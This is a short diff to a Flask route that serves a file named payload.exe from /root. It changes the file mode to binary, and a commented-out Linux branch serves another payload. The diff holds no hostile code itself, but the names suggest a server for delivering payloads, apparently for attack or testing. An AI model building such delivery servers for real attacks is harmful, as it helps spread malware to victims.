@@ -25,7 +25,7 @@ def SHA512(value):
 @app.route('/download/platform=<value>', methods=['GET'])
 def Download_File(value):
     if value == "win":
-        return send_file(open('/root/payload.exe', 'r'))
+        return send_file(open('/root/payload.exe', 'rb'))
     #elif value == "liunx":
         #return send_file(open('/root/payload', 'r'))
     else:
